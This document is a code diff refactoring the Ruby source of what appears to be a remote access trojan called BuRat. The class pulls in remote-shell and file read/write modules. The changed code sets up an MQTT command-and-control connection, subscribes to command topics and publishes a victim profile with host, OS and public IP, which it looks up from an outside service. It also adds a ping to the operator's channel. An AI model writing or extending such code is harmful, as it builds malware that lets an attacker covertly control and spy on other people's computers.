@@ -12,9 +12,8 @@ require_relative 'bushido/filerw/bufilerw'
 require_relative 'bushido/remoteshell/buremoteshell'
 
 class BuRat
-  attr_reader :id, :host, :os, :ip
-  attr_accessor :status, :internals, :bushido
-  attr_reader :topics
+  attr_reader :id, :host, :os, :ip, :internals, :bushido
+  attr_accessor :status
   def initialize()
     begin
       @id = id()
@@ -100,7 +99,7 @@ class BuRat
   def connect()
     @connect_thread = Thread.new do
       begin
-        test()
+        init_mqtt()
         @internals[:mqtt].connect()
         @internals[:mqtt].subscribe(@cmd_topics)
       rescue StandardError => error
@@ -113,6 +112,10 @@ class BuRat
 
   def connecting?
     @connect_thread != nil && @connect_thread.status ? true : false
+  end
+
+  def ping()
+    @internals[:mqtt].publish(@topics[:nil], nil, false, 2)
   end
 
   private
@@ -145,11 +148,10 @@ class BuRat
     open('http://whatismyip.akamai.com').read
   end
 
-  def test()
+  def init_mqtt()
     @internals[:mqtt].on_connack do
     	@status = :online
-    	packet = profile()
-    	@internals[:mqtt].publish(@topics[:bushi], packet, true, 2)
+    	@internals[:mqtt].publish(@topics[:bushi], profile(), true, 2)
     end
     @internals[:mqtt].host = 'localhost'
     @internals[:mqtt].port = 1883
